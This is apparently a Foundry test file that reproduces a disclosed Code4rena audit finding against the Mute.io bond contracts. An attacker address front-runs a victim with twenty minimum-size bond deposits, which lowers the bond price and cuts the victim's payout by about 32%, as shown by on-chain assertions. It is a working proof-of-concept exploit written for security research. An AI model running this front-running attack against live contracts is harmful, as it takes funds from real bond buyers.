// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

// Real audited Mute.io sources, vendored unmodified from
// code-423n4/2023-03-mute @ 4d8b13add2907b17ac14627cfa04e0c3cc9a2bed:
import "../src/mute/bonds/MuteBond.sol";          // contracts/bonds/MuteBond.sol  (VULNERABLE)
import "../src/mute/bonds/BondTreasury.sol";       // contracts/bonds/BondTreasury.sol (custom treasury)
import "../src/mute/dao/dMute.sol";                // contracts/dao/dMute.sol (payout lock / accounting)
import "../src/mute/test/ERC20Default.sol";        // contracts/test/ERC20Default.sol (real MUTE / LP token)

/// @title MuteBond front-run — real audited stack, no mocks on the exploit path
/// @notice Deploys the REAL MuteBond + REAL BondTreasury + REAL dMute + REAL
///         ERC20 tokens (the exact audited sources) and reproduces Code4rena
///         2023-03-mute [H-02]: an attacker front-runs a bond buyer with a burst
///         of minimum-size purchases. Every purchase advances `epochStart` by ~5%
///         of the elapsed time, which lowers `bondPrice()` for the victim's later
///         deposit. The victim receives a strictly smaller MUTE payout than the
///         quote they observed — measured on-chain via the real dMute accounting.
contract MuteBondFrontRunTest is Test {
    ERC20Default internal mute;   // real payout token
    ERC20Default internal lp;     // real principal (inflow) token
    BondTreasury internal treasury;
    dMute internal dmuteToken;
    MuteBond internal bond;

    address internal attacker = address(0xA11CE);
    address internal victim = address(0xB0B);

    // Deployment parameters matching the Code4rena test/bonds.ts deployment:
    // startPrice 100e18 -> maxPrice 200e18 across one seven-day epoch.
    uint256 constant MAX_PRICE = 200e18;
    uint256 constant START_PRICE = 100e18;
    uint256 constant MAX_PAYOUT = 1_000_000e18;

    function setUp() public {
        // Real ERC20s. ERC20Default mints the whole supply to the deployer (this).
        mute = new ERC20Default(2_000_000e18);
        lp = new ERC20Default(1_000_000e18);

        // Real custom treasury (holds/pays MUTE) and real dMute lock token.
        treasury = new BondTreasury(address(mute));
        dmuteToken = new dMute(address(mute));

        // Real vulnerable bond. Constructor reads treasury.payoutToken() and
        // approves dMute to pull the payout MUTE (TransferHelper.safeApprove).
        bond = new MuteBond(
            address(treasury),
            address(lp),
            address(dmuteToken),
            MAX_PRICE,
            START_PRICE,
            MAX_PAYOUT
        );

        // Real treasury gate: only whitelisted bond contracts may pull payout.
        treasury.whitelistBondContract(address(bond));
        // Fund the treasury with MUTE so it can pay out on each deposit.
        mute.transfer(address(treasury), 1_000_000e18);

        // Distribute LP principal and approve the bond, for both parties.
        lp.transfer(attacker, 1_000e18);
        lp.transfer(victim, 1_000e18);
        vm.prank(attacker);
        lp.approve(address(bond), type(uint256).max);
        vm.prank(victim);
        lp.approve(address(bond), type(uint256).max);
    }

    function testRealMuteBondFrontRunLowersVictimPayout() public {
        // One epoch elapses so the bond reaches its maximum price (best payout).
        // This is the quote the victim sees when they broadcast their transaction.
        vm.warp(block.timestamp + 7 days);
        uint256 expectedPrice = bond.bondPrice();
        uint256 expectedPayout = bond.payoutFor(10 ether);
        assertEq(expectedPrice, MAX_PRICE, "bond should have reached max price");
        assertEq(expectedPayout, 2000 ether, "quote is 2000 MUTE for 10 LP at max price");

        // ATTACK (test/bonds.ts): twenty minimum-size purchases. Each real
        // deposit runs the audited epochStart advance and pushes the price curve
        // back down before the victim's transaction lands.
        uint256 minimumValue = (0.01 ether * 1e18) / bond.startPrice() + 1;
        for (uint256 i; i < 20; ++i) {
            vm.prank(attacker);
            bond.deposit(minimumValue, attacker, false);
        }

        uint256 actualPrice = bond.bondPrice();
        assertLt(actualPrice, expectedPrice, "front-run must lower the price");
        assertLe(actualPrice * 100, expectedPrice * 70, "documented >=30% payout reduction did not occur");

        // `deposit` advances epochStart within the same call, so quote the payout
        // immediately before the victim's state-changing purchase.
        uint256 payoutAtExecution = bond.payoutFor(10 ether);
        uint256 victimUnderlyingBefore = dmuteToken.GetUnderlyingTokens(victim);

        vm.prank(victim);
        uint256 payoutReceived = bond.deposit(10 ether, victim, false);

        // Harm, proven through the REAL dMute accounting (not a mock):
        // the victim's locked underlying equals the reduced payout they received.
        uint256 victimUnderlyingAfter = dmuteToken.GetUnderlyingTokens(victim);
        assertEq(payoutReceived, payoutAtExecution, "received payout must equal the execution-time quote");
        assertEq(
            victimUnderlyingAfter - victimUnderlyingBefore,
            payoutReceived,
            "dMute must record exactly the reduced payout"
        );
        assertLt(payoutReceived, expectedPayout, "victim payout must be below the observed quote");

        uint256 payoutLoss = expectedPayout - payoutReceived;
        assertGt(payoutLoss, 0, "victim must suffer a strictly positive payout loss");

        emit log_named_uint("expected price (max)        ", expectedPrice);
        emit log_named_uint("actual price after front-run", actualPrice);
        emit log_named_uint("expected payout (MUTE wad)  ", expectedPayout);
        emit log_named_uint("victim payout   (MUTE wad)  ", payoutReceived);
        emit log_named_uint("victim payout LOSS (MUTE)   ", payoutLoss);
        // ~2000 -> ~1358 MUTE, a loss of ~641 MUTE (~32%), matching the report.
    }
}
